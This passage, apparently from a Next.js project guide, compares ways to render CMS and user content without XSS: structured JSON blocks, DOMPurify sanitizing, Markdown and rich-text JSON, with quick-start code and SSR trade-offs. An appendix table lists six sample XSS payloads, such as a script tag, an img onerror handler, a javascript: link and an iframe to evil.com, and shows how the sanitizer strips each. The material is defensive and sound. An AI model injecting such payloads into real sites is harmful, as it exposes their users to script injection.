                               │          │
                              YES         NO
                               │          │
                    ┌──────────▼─┐  ┌─────▼──────┐
                    │ Is the    │  │             │
                    │ data      │  │ Use         │
                    │ structured│  │ Sanitized   │
                    │ or text?  │  │ HTML        │
                    └───┬───┬───┘  │ Renderer    │
                        │   │      └────────────┘
                 ┌──────▼┐ ┌▼─────┐
                 │ JSON  │ │Text  │
                 │       │ │      │
                 ▼       ▼ ▼      ▼
           Structured  Markdown  RTE
           Renderer    Renderer  Renderer
           🥇          🥇        🥈
```

---

## 4. Decision Matrix

| Your Scenario | Recommended Solution | How Safe? | Effort to Implement | SSR Quality |
|---------------|---------------------|-----------|-------------------|-------------|
| 🆕 **New CMS project** | Solution 1: Structured Content | 🟢 **Maximum** (no HTML at all) | 🟡 Medium | 🟢 **Full SSR** |
| 📝 **Blog / documentation** | Solution 3: Markdown | 🟢 **Maximum** (safe format) | 🟢 Low | 🟢 **Full SSR** |
| ✏️ **Rich text editor** | Solution 4: RTE JSON | 🟢 **Maximum** (structured data) | 🟡 Medium | 🟡 **Partial SSR** |
| ♻️ **Migrating legacy HTML** | Solution 2: DOMPurify | 🟡 **Good** (sanitized) | 🟢 Low | 🔴 **No SSR** (client only) |
| ♻️ **Legacy + New content** | Solution 2 + Solution 1 | 🟢 **Maximum** (combined) | 🔴 High | 🟢 **Full SSR** (after migration) |
| 🎨 **CSS-in-JS SSR** | Keep existing code | 🟢 **Safe** (no user input) | 🟢 None | 🟢 **Full SSR** (styles in `<head>`) |

### When to Combine Solutions

```
Current State:  Legacy HTML content in database ▼
                    │
                    ▼
    ┌───────────────────────────────────┐
    │ Phase 1: Solution 2 (DOMPurify)  │  ← Deploy immediately to fix XSS
    │ "Safety first — sanitize all HTML"│
    │ Note: Content is client-rendered  │  ← ⚠️ SSR impact
    └───────────────┬───────────────────┘
                    │
                    ▼
    ┌───────────────────────────────────┐
    │ Phase 2: Solution 1 (Structured) │  ← Gradual migration
    │ "Replace HTML blocks with JSON"   │
    │ Note: Content is SSR-rendered     │  ← ✅ SSR restored
    └───────────────┬───────────────────┘
                    │
                    ▼
    ┌───────────────────────────────────┐
    │ Phase 3: Retire DOMPurify         │  ← All content migrated
    │ "No more dangerouslySetInnerHTML" │
    │ SSR performance is optimal        │  ← ✅ Best SSR
    └───────────────────────────────────┘
```

---

## 5. Quick Start Guide

### 5.1 Render Structured Content (Full SSR)

```tsx
// app/articles/[slug]/page.tsx  (Server Component — no 'use client')
import { StructuredRenderer } from '@/components/structured-renderer';

async function getArticle(slug: string) {
  const res = await fetch(`https://cms.example.com/articles/${slug}`);
  return res.json() as Article;
}

export default async function ArticlePage({
  params,
}: {
  params: { slug: string };
}) {
  const article = await getArticle(params.slug);

  return (
    <article>
      <h1>{article.title}</h1>
      {/* ✅ Content is embedded in SSR HTML */}
      <StructuredRenderer content={article.body} />
    </article>
  );
}
```

### 5.2 Safely Render User HTML (Client-only, no SSR)

```tsx
// components/UserComment.tsx
'use client';

import { SanitizedHTMLRenderer } from '@/components/sanitized-html-renderer';

export function UserComment({ html }: { html: string }) {
  return (
    <div className="comment">
      {/* ⚠️ Content appears AFTER hydration (no SSR HTML) */}
      <SanitizedHTMLRenderer html={html} mode="auto" />
    </div>
  );
}
```

### 5.3 Render Markdown (Full SSR)

```tsx
// components/BlogContent.tsx  (Server Component — no 'use client')
import { MarkdownRenderer } from '@/components/markdown-renderer';

export function BlogContent({ markdown }: { markdown: string }) {
  return (
    <article className="prose max-w-none">
      {/* ✅ Content is embedded in SSR HTML */}
      <MarkdownRenderer content={markdown} />
    </article>
  );
}
```

### 5.4 Render RTE JSON (Partial SSR)

```tsx
// components/NewsArticle.tsx  (Client Component — needs 'use client')
'use client';

import { RTERenderer } from '@/components/rte-renderer';

const editorContent = {
  type: 'doc',
  content: [
    {
      type: 'heading',
      attrs: { level: 2 },
      content: [{ type: 'text', text: 'Breaking News' }],
    },
  ],
};

export function NewsArticle() {
  return (
    <div className="news-article">
      {/* ⚠️ 'use client' needed, but content IS in SSR HTML */}
      <RTERenderer content={editorContent} />
    </div>
  );
}
```

---

## Appendix: XSS Attack Demo

The `/dangerous-html` page demonstrates how 6 common XSS attack vectors are handled:

| # | Attack Vector | Example Input | DOMPurify Result | Why it fails |
|---|---------------|---------------|------------------|--------------|
| 1 | **Direct Script Injection** | `<script>alert('XSS')</script>` | ❌ Completely removed | `<script>` is in FORBID_TAGS |
| 2 | **Error Event Attack** | `<img src="x" onerror="alert('XSS')">` | ❌ Event removed, `<img>` preserved | `onerror` is in FORBID_ATTR |
| 3 | **Protocol Hijacking** | `<a href="javascript:alert('XSS')">click</a>` | ❌ Protocol removed | `javascript:` blocked by ALLOWED_URI_REGEXP |
| 4 | **Inline Frame** | `<iframe src="https://evil.com">` | ❌ Completely removed | `<iframe>` is in FORBID_TAGS |
| 5 | **Mouse Event** | `<p onmouseover="alert('XSS')">hover</p>` | ❌ Event removed, `<p>` preserved | `onmouseover` is in FORBID_ATTR |
| 6 | **CSS Injection** | `<style>body{display:none}</style>` | ❌ Completely removed | `<style>` is in FORBID_TAGS |

---

## Appendix: File Manifest

```
src/
├── types/
│   └── content.ts                        # Content block type definitions & data interfaces
├── lib/
│   ├── content-registry.tsx              # Block type → Component mapping registry
│   ├── sanitize-config.ts                # DOMPurify security configuration (whitelist/blacklist)
│   └── sanitize-html.ts                  # DOMPurify utility (SSR-compatible, lazy-loaded)
├── components/
│   ├── blocks/
│   │   ├── paragraph-block.tsx           # Paragraph block component
│   │   ├── heading-block.tsx             # Heading block component (h1-h6)
│   │   ├── image-block.tsx               # Image block component (controlled attributes)
│   │   ├── code-block.tsx                # Code block component (syntax highlighting)
│   │   ├── list-block.tsx                # List block component (ordered/unordered)
│   │   ├── quote-block.tsx               # Blockquote component
│   │   └── divider-block.tsx             # Horizontal divider component
│   ├── structured-renderer.tsx           # Solution 1: Structured content → React components
│   │                                     #   SSR: ✅ Full HTML in initial payload
│   ├── sanitized-html-renderer.tsx       # Solution 2: DOMPurify → dangerouslySetInnerHTML
│   │                                     #   SSR: ❌ Content after hydration
│   ├── markdown-renderer.tsx             # Solution 3: Markdown → React components
│   │                                     #   SSR: ✅ Full HTML in initial payload
│   └── rte-renderer.tsx                  # Solution 4: TipTap JSON → React components
│                                         #   SSR: ⚠️ HTML generated from JSON, needs 'use client'
└── app/
    └── dangerous-html/
        └── page.tsx                      # Interactive demo: XSS attacks & solution comparison
```

---

---

## Appendix: References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOMPurify GitHub](https://github.com/cure53/DOMPurify) — Security library by Cure53
- [React dangerouslySetInnerHTML Docs](https://react.dev/reference/react-dom/components/common#dangerously-set-inner-html)
- [react-markdown GitHub](https://github.com/remarkjs/react-markdown) — React component for rendering Markdown
- [rehype-sanitize GitHub](https://github.com/rehypejs/rehype-sanitize) — Sanitize HTML in rehype (used with react-markdown)
- [TipTap GitHub](https://github.com/ueberdosis/tiptap) — Rich text editor framework (JSON AST output)
- [ProseMirror GitHub](https://github.com/ProseMirror/prosemirror) — Underlying engine for TipTap (document model)
- [Next.js Emotion Registry (official example)](https://nextjs.org/docs/app/building-your-application/styling/css-in-js#emotion)
- [Next.js Server Components](https://nextjs.org/docs/app/building-your-application/rendering/server-components)
- [isomorphic-dompurify GitHub](https://github.com/kkomelin/isomorphic-dompurify) — SSR-safe DOMPurify wrapper
- [Next.js CSS-in-JS GitHub Example](https://github.com/vercel/next.js/tree/canary/examples/with-emotion) — Official Next.js Emotion example project
- [Vercel Next.js + Emotion Template](https://github.com/vercel/next.js/tree/canary/examples/with-emotion) — Vercel's official template for Emotion SSR
- [Emotion SSR GitHub Issue #2928](https://github.com/emotion-js/emotion/issues/2928) — Official Emotion SSR tracking issue
- [MUI System (sx prop) GitHub](https://github.com/mui/material-ui/tree/master/packages/mui-system) — MUI's sx prop implementation (uses Emotion)
- [styled-components SSR GitHub Example](https://github.com/vercel/next.js/tree/canary/examples/with-styled-components) — Official Next.js styled-components example
- [OWASP XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) — Advanced XSS attack patterns for testing
